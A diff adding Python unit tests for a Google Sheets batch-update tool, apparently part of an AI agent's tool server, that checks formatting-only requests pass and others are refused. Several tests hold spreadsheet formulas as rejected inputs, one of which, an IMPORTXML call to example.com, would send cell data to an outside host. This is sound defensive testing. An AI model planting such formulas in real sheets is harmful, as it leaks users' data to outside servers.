@@ -1,6 +1,7 @@
 """Gmail / Calendar / Sheets / Docs / Slides ツールのテスト。Google API はモックする。"""
 
 import base64
+import json
 import unittest
 from unittest.mock import MagicMock
 
@@ -78,6 +79,10 @@ WRITE_TOOLS = {
     ),
     "sheets_add_sheet": (
         {"spreadsheet_id": FILE_ID, "title": "新シート"},
+        lambda s: s.apis["sheets"].spreadsheets.return_value.batchUpdate,
+    ),
+    "sheets_batch_update": (
+        {"spreadsheet_id": FILE_ID, "requests": '[{"autoResizeDimensions": {"dimensions": {"sheetId": 0}}}]'},
         lambda s: s.apis["sheets"].spreadsheets.return_value.batchUpdate,
     ),
     "docs_append_text": ({"document_id": FILE_ID, "text": "x"}, lambda s: s.docs_documents.batchUpdate),
@@ -240,6 +245,227 @@ class SheetsTest(unittest.TestCase):
             validate(schema, {"spreadsheet_id": FILE_ID, "range": "A1", "values": [[{"a": 1}]]})
         with self.assertRaises(SchemaError):
             validate(schema, {"spreadsheet_id": FILE_ID, "range": "A1", "values": [[None]]})
+
+
+# 書式のリクエストの例
+_BOLD_HEADER = {
+    "repeatCell": {
+        "range": {"sheetId": 0, "endRowIndex": 1},
+        "cell": {"userEnteredFormat": {"textFormat": {"bold": True}}},
+        "fields": "userEnteredFormat.textFormat.bold",
+    }
+}
+
+
+def _rule(value, condition_type="TEXT_EQ"):
+    """条件の値に value を入れた条件付き書式のリクエスト。"""
+    return {
+        "addConditionalFormatRule": {
+            "rule": {
+                "ranges": [{"sheetId": 0}],
+                "booleanRule": {
+                    "condition": {"type": condition_type, "values": [{"userEnteredValue": value}]},
+                    "format": {"backgroundColor": {"red": 1}},
+                },
+            }
+        }
+    }
+
+
+def _dropdown(*choices):
+    """選択肢を choices にしたプルダウンのリクエスト。"""
+    values = [{"userEnteredValue": c} for c in choices]
+    return {
+        "setDataValidation": {
+            "range": {"sheetId": 0, "startColumnIndex": 2, "endColumnIndex": 3},
+            "rule": {"condition": {"type": "ONE_OF_LIST", "values": values}, "showCustomUi": True},
+        }
+    }
+
+
+class SheetsBatchUpdateTest(unittest.TestCase):
+    def _call(self, requests):
+        """requests を JSON 文字列にして呼ぶ。結果と batchUpdate のモックを返す。"""
+        s = FakeServices({FILE_ID: MY_FILE})
+        batch = s.apis["sheets"].spreadsheets.return_value.batchUpdate
+        batch.return_value.execute.return_value = {"replies": [{}] * len(requests)}
+        text = requests if isinstance(requests, str) else json.dumps(requests)
+        return call(s, "sheets_batch_update", {"spreadsheet_id": FILE_ID, "requests": text}), batch
+
+    def _assert_rejected(self, requests, *messages):
+        result, batch = self._call(requests)
+        self.assertTrue(result["isError"], result)
+        for m in messages:
+            self.assertIn(m, result["content"][0]["text"])
+        batch.assert_not_called()
+
+    def test_書式のリクエストをそのまま渡しrepliesを返す(self):
+        requests = [
+            _BOLD_HEADER,
+            {
+                "updateSheetProperties": {
+                    "properties": {"sheetId": 0, "gridProperties": {"frozenRowCount": 1}},
+                    "fields": "gridProperties.frozenRowCount",
+                }
+            },
+            {
+                "updateDimensionProperties": {
+                    "range": {"sheetId": 0, "dimension": "COLUMNS", "startIndex": 0, "endIndex": 1},
+                    "properties": {"pixelSize": 300},
+                    "fields": "pixelSize",
+                }
+            },
+            {"setBasicFilter": {"filter": {"range": {"sheetId": 0}}}},
+            {"addBanding": {"bandedRange": {"range": {"sheetId": 0}}}},
+            {"mergeCells": {"range": {"sheetId": 0, "endRowIndex": 1}, "mergeType": "MERGE_ALL"}},
+            _rule("高"),
+            _dropdown("OK", "NG", "保留"),
+        ]
+        result, batch = self._call(requests)
+        self.assertFalse(result["isError"], result)
+        self.assertEqual(batch.call_args.kwargs, {"spreadsheetId": FILE_ID, "body": {"requests": requests}})
+        self.assertEqual(json.loads(result["content"][0]["text"]), {"replies": [{}] * len(requests)})
+
+    def test_許可リスト外のリクエストは拒否する(self):
+        for kind in ("deleteSheet", "deleteRange", "deleteDimension", "updateCells", "appendCells", "pasteData",
+                     "copyPaste", "cutPaste", "addProtectedRange", "updateProtectedRange",
+                     "addDataSource", "refreshDataSource", "addChart", "addNamedRange", "updateSpreadsheetProperties"):
+            with self.subTest(kind=kind):
+                self._assert_rejected([{kind: {}}], f"{kind} は使えません")
+
+    def test_repeatCellで値を書き込まない(self):
+        cell = {"userEnteredValue": {"formulaValue": "=1+1"}, "userEnteredFormat": {}}
+        self._assert_rejected(
+            [{"repeatCell": {"range": {"sheetId": 0}, "cell": cell, "fields": "userEnteredFormat"}}],
+            "cell.userEnteredValue",
+        )
+
+    def test_repeatCellのfieldsは書式の項目だけ(self):
+        for fields in ("*", "userEnteredValue", "userEnteredFormat,userEnteredValue", "note", "userEnteredFormatX", ""):
+            with self.subTest(fields=fields):
+                req = {**_BOLD_HEADER["repeatCell"], "fields": fields}
+                self._assert_rejected([{"repeatCell": req}], "fields")
+
+    def test_repeatCellのfieldsは形が崩れていれば拒否する(self):
+        for fields in ("userEnteredFormat(a)),userEnteredValue", "userEnteredFormat(a,userEnteredValue",
+                       "userEnteredFormat;userEnteredValue", "userEnteredFormat/userEnteredValue",
+                       "userEnteredFormat(a)userEnteredValue", "userEnteredFormat(a)(userEnteredValue)",
+                       "userEnteredFormat.a userEnteredValue", "userEnteredFormat()", "userEnteredFormat(,)",
+                       "userEnteredFormat..x", "userEnteredFormat,,userEnteredValue",
+                       "userEnteredFormat" + "(a" * 1000 + ")" * 1000):
+            with self.subTest(fields=fields):
+                req = {**_BOLD_HEADER["repeatCell"], "fields": fields}
+                self._assert_rejected([{"repeatCell": req}], "fields")
+
+    def test_repeatCellはsnake_caseの値も拒否する(self):
+        req = {**_BOLD_HEADER["repeatCell"], "cell": {"user_entered_value": {"stringValue": "x"}}}
+        self._assert_rejected([{"repeatCell": req}], "cell.user_entered_value")
+
+    def test_fieldsの括弧の入れ子は書式に必要な深さまで(self):
+        # 実在する書式で一番深いのは borders(top(colorStyle(rgbColor(red))))
+        ok = {**_BOLD_HEADER["repeatCell"], "fields": "userEnteredFormat(borders(top(colorStyle(rgbColor(red)))))"}
+        result, _ = self._call([{"repeatCell": ok}])
+        self.assertFalse(result["isError"], result)
+        too_deep = {**_BOLD_HEADER["repeatCell"], "fields": "userEnteredFormat(a(b(c(d(e(f))))))"}
+        self._assert_rejected([{"repeatCell": too_deep}], "fields")
+
+    def test_fieldsの特殊な空白は拒否する(self):
+        for fields in ("userEnteredFormat\x1c(a)", "userEnteredFormat(a)\xa0", "userEnteredFormat\u3000,userEnteredValue"):
+            with self.subTest(fields=fields):
+                self._assert_rejected([{"repeatCell": {**_BOLD_HEADER["repeatCell"], "fields": fields}}], "fields")
+
+    def test_repeatCellのfieldsは括弧でまとめて指定できる(self):
+        req = {**_BOLD_HEADER["repeatCell"], "fields": "userEnteredFormat(textFormat,backgroundColor), userEnteredFormat.wrapStrategy"}
+        result, batch = self._call([{"repeatCell": req}])
+        self.assertFalse(result["isError"], result)
+        batch.assert_called_once()
+
+    def test_シートと列幅のfieldsは許可した項目を通す(self):
+        cases = {
+            "updateSheetProperties": "gridProperties.frozenRowCount,gridProperties.frozenColumnCount,tabColorStyle",
+            "updateDimensionProperties": "pixelSize",
+        }
+        for kind, fields in cases.items():
+            with self.subTest(kind=kind):
+                result, batch = self._call([{kind: {"properties": {}, "fields": fields}}])
+                self.assertFalse(result["isError"], result)
+                batch.assert_called_once()
+
+    def test_シートと列幅のfieldsは許可した項目だけ(self):
+        cases = {
+            "updateSheetProperties": ("title", "gridProperties.rowCount", "hidden", "*", ""),
+            "updateDimensionProperties": ("hiddenByUser", "pixelSize,hiddenByUser", "*", ""),
+        }
+        for kind, fields_list in cases.items():
+            for fields in fields_list:
+                with self.subTest(kind=kind, fields=fields):
+                    self._assert_rejected([{kind: {"properties": {}, "fields": fields}}], "fields")
+
+    def test_フィルタの絞り込みは通す(self):
+        spec = {"columnIndex": 0, "filterCriteria": {"hiddenValues": ["x"]}}
+        req = {"filter": {"range": {"sheetId": 0}, "filterSpecs": [spec], "criteria": {}}}
+        result, batch = self._call([{"setBasicFilter": req}])
+        self.assertFalse(result["isError"], result)
+        batch.assert_called_once()
+
+    def test_並べ替えと検索置換は通す(self):
+        sort = [{"dimensionIndex": 0, "sortOrder": "ASCENDING"}]
+        requests = [
+            {"sortRange": {"range": {"sheetId": 0, "startRowIndex": 1}, "sortSpecs": sort}},
+            {"setBasicFilter": {"filter": {"range": {"sheetId": 0}, "sortSpecs": sort}}},
+            {"findReplace": {"find": "旧", "replacement": "新", "allSheets": True}},
+        ]
+        result, batch = self._call(requests)
+        self.assertFalse(result["isError"], result)
+        batch.assert_called_once()
+
+    def test_置換後の文字列で外部URLにアクセスする関数は拒否する(self):
+        req = {"findReplace": {"find": "x", "replacement": '=IMPORTDATA("https://example.com")', "allSheets": True}}
+        self._assert_rejected([req], "外部 URL")
+
+    def test_cellがオブジェクトでなければ拒否する(self):
+        self._assert_rejected([{"repeatCell": {**_BOLD_HEADER["repeatCell"], "cell": "userEnteredValue"}}], "cell: オブジェクト")
+
+    def test_条件の数式で外部URLにアクセスする関数は拒否する(self):
+        for req in (
+            _rule('=IMPORTXML("https://example.com/?q="&A1, "//a")', "CUSTOM_FORMULA"),
+            _rule("=image(A1)", "CUSTOM_FORMULA"),
+            _dropdown("OK", '=IMPORTDATA("https://example.com")'),
+            {"setDataValidation": {**_dropdown()["setDataValidation"], "rule": {"condition": {
+                "type": "CUSTOM_FORMULA", "values": [{"userEnteredValue": '=IMPORTFEED("https://example.com")'}]}}}},
+        ):
+            with self.subTest(req=req):
+                self._assert_rejected([req], "外部 URL")
+
+    def test_条件の数式でも外部に出ないものは通す(self):
+        result, batch = self._call([_rule('=$B1="高"', "CUSTOM_FORMULA")])
+        self.assertFalse(result["isError"], result)
+        batch.assert_called_once()
+
+    def test_一部だけ不正なら全体を拒否する(self):
+        self._assert_rejected([_BOLD_HEADER, {"deleteSheet": {"sheetId": 0}}], "requests[1]", "何も変更していません")
+        self._assert_rejected([_BOLD_HEADER, _rule("=IMPORTHTML(A1)", "CUSTOM_FORMULA")], "requests[1]")
+
+    def test_形の不正な入力は拒否する(self):
+        for text in ("not json", "{}", "[]", "[1]", '[{"repeatCell": {}, "mergeCells": {}}]', '[{"mergeCells": []}]'):
+            with self.subTest(text=text):
+                self._assert_rejected(text)
+
+    def test_件数の上限を超えると拒否する(self):
+        result, batch = self._call([{"autoResizeDimensions": {}}] * 200)
+        self.assertFalse(result["isError"], result)
+        self._assert_rejected([{"autoResizeDimensions": {}}] * 201, "200 件以下")
+
+    def test_文字列の長さの上限を超えると拒否する(self):
+        schema = load_tools()["sheets_batch_update"].input_schema
+        with self.assertRaises(SchemaError):
+            validate(schema, {"spreadsheet_id": FILE_ID, "requests": "x" * 200_001})
+
+    def test_入れ子が深くても検査の途中で落ちない(self):
+        # Python の再帰の上限（既定 1000）を超える深さでも、最後の文字列まで検査が届く
+        depth = 5_000
+        text = '[{"autoResizeDimensions": ' + '{"x": ' * depth + '"=IMAGE(A1)"' + "}" * depth + "}]"
+        self._assert_rejected(text, "外部 URL")
 
 
 # 参加者がいる予定の作成引数
